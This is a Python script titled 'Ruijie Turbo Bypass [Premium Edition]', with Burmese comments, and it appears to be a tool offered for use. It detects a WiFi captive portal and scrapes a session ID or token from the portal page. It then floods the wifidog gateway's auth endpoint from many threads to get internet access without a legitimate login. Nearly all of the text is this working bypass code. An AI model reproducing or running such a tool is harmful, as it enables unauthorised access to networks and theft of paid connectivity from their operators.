    ██╔══██╗  ╚██╔╝  ██╔═══╝ ██╔══██║╚════██║╚════██║
    ██████╔╝   ██║   ██║     ██║  ██║███████║███████║
    ╚═════╝    ╚═╝   ╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
           {W}RUIJIE TURBO BYPASS {M}[PREMIUM EDITION]{X}
    """)

def high_speed_ping(auth_link, sid):
    session = requests.Session()
    while not STOP_EVENT.is_set():
        try:
            session.get(auth_link, timeout=5)
            status_color = random.choice([G, C, M])
            print(f"{status_color}[✓]{X} SID: {Y}{sid[:10]}... {G}Pulse Sending{X}      ", end="\r")
        except:
            break
        time.sleep(0.05)

def start_process():
    banner()
    print(f"{C}[*] Initializing Turbo Engine...{X}")

    while not STOP_EVENT.is_set():
        session = requests.Session()
        try:
            # Check for Portal
            test = requests.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=True)
            
            if test.status_code == 204 and test.url.endswith("generate_204"):
                print(f"{Y}[-] Internet Already Active. Monitoring...{X}", end="\r")
                time.sleep(5)
                continue

            portal_url = test.url
            print(f"\n{G}[!] Portal Detected: {W}{urlparse(portal_url).netloc}{X}")

            res = session.get(portal_url, verify=False, timeout=10)
            sid = None
            
            # ပိုမိုကျယ်ပြန့်သော SID ရှာဖွေမှု (sessionId, sid, token, auth_token)
            search_patterns = [
                r'(?i)(?:sessionid|sid|token|auth_token)=([a-zA-Z0-9_-]+)',
                r'\"sessionId\":\"([a-zA-Z0-9_-]+)\"',
                r'\'sid\':\'([a-zA-Z0-9_-]+)\''
            ]

            # URL ထဲမှာ ရှာမယ်
            for pattern in search_patterns:
                match = re.search(pattern, res.url)
                if match:
                    sid = match.group(1)
                    break
            
            # HTML ထဲမှာ ထပ်ရှာမယ်
            if not sid:
                for pattern in search_patterns:
                    match = re.search(pattern, res.text)
                    if match:
                        sid = match.group(1)
                        break

            if not sid:
                print(f"{R}[×] SID not found. Retrying... (Check WiFi Login Page){X}")
                time.sleep(5)
                continue

            print(f"{G}[✓] Captured SID: {W}{sid}{X}")

            parsed_p = urlparse(portal_url)
            params = parse_qs(parsed_p.query)
            gw_addr = params.get('gw_address', ['192.168.60.1'])[0]
            gw_port = params.get('gw_port', ['2060'])[0]
            auth_link = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}"

            print(f"{M}[*] Launching {PING_THREADS} Turbo Threads...{X}")
            for _ in range(PING_THREADS):
                threading.Thread(target=high_speed_ping, args=(auth_link, sid), daemon=True).start()

            while True:
                try:
                    check = requests.get("http://www.google.com", timeout=5)
                    if check.status_code != 200: break
                except: break
                time.sleep(10)

        except Exception as e:
            time.sleep(5)

if __name__ == "__main__":
    if check_approval():
        try:
            start_process()
        except KeyboardInterrupt:
            STOP_EVENT.set()
            print(f"\n{R}[!] Stopped.{X}")
